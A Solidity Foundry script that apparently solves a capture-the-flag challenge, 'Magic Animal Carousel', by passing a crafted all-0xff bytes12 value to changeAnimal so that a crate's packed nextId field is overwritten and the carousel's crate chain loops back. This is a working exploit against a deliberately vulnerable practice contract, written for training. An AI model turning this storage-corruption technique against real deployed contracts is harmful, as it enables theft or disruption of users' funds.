// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script} from "forge-std/Script.sol";
import {MagicAnimalCarousel} from "../../src/challenge-33-magic-animal-carousel/MagicAnimalCarousel.sol";

contract AttackMagicAnimalCarouselScript is Script {
    function run() external {
        address carouselAddress = vm.envAddress("CAROUSEL");

        MagicAnimalCarousel carousel = MagicAnimalCarousel(carouselAddress);

        vm.startBroadcast();

        // Step 1: initialize crate 1
        carousel.setAnimalAndSpin("abcdefghij");

        // Step 2: corrupt crate 1 nextId to 0xffff = 65535
        string memory corruptedAnimal = string(
            abi.encodePacked(bytes12(type(uint96).max))
        );

        carousel.changeAnimal(corruptedAnimal, 1);

        // Step 3: move currentCrateId to 65535.
        // Crate 65535 will point back to crate 1.
        carousel.setAnimalAndSpin("mnopqrstuv");

        vm.stopBroadcast();
    }
}